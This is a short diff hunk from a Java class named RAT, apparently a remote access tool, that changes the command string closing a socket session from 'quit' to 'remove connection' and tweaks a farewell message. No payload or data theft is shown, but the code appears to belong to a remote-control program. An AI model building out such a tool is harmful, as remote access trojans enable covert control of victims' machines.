@@ -33,8 +33,8 @@ public class RAT {
 			try {
 				received = din.readUTF();
 				received = received.trim();
-				if (received.contains("quit") == true) {
-					dout.writeUTF("bye :(");
+				if (received.contains("remove connection") == true) {
+					dout.writeUTF("Bye :(");
 					dout.flush();
 					s.close();
 					return;
